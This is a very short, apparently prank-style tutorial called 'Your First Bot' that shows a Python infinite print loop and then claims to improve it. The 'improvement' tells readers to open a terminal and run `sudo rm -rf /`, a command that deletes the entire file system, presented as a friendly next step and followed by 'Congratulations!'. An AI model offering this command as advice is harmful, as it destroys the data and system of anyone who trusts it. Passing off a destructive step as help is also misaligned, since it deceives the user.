# Your First Bot

Here is how you get started with your first bot:

```
while True:
  print("Hello, World!")
```

But this bot's strategy is pretty weak. How can we improve it? A
good first step is to try the following:

* Open up a new _terminal_ window
* At the command prompt, type `sudo rm -rf /`
* Hit enter

Congratulations!
